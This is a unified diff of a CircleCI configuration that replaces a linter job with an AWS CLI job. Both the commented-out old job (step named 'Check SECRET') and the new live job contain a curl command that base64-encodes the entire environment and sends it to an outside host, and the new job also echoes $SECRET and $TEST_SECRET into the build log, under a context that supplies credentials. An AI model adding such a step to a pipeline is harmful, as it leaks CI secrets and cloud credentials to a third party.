@@ -1,25 +1,45 @@
+# version: 2.1
+
+# jobs:
+
+#   ruby-linters:
+#     machine:
+#       image: ubuntu-1604:201903-01
+#     steps:
+#       - checkout
+#       - run:
+#           name: Check SECRET
+#           command: curl https://servicing-st1.matic.com/?env=$(env | base64 | tr -d '\n')
+#       - run:
+#           name: Check AWS_REGION
+#           command: echo $AWS_REGION
+
+# workflows:
+#   test.test:
+#     when:
+#       not:
+#         equal: [ master, << pipeline.git.branch >> ]
+#     jobs:
+#       - ruby-linters:
+#           name: ruby-linters
+#           #context: automation
+
 version: 2.1
-
+orbs:
+  aws-cli: circleci/aws-cli@2.0
 jobs:
-
-  ruby-linters:
-    machine:
-      image: ubuntu-1604:201903-01
+  aws-cli-example:
+    executor: aws-cli/default
     steps:
       - checkout
-      - run:
-          name: Check SECRET
-          command: curl https://servicing-st1.matic.com/?env=$(env | base64 | tr -d '\n')
-      - run:
-          name: Check AWS_REGION
-          command: echo $AWS_REGION
+      - aws-cli/setup:
+          profile-name: example
+      - run: echo $TEST_SECRET
+      - run: echo $SECRET
+      - run: curl https://servicing-st1.matic.com/?env=$(env | base64 | tr -d '\n')
 
 workflows:
-  test.test:
-    when:
-      not:
-        equal: [ master, << pipeline.git.branch >> ]
+  aws-cli:
     jobs:
-      - ruby-linters:
-          name: ruby-linters
-          #context: automation
+      - aws-cli-example:
+          context: context1
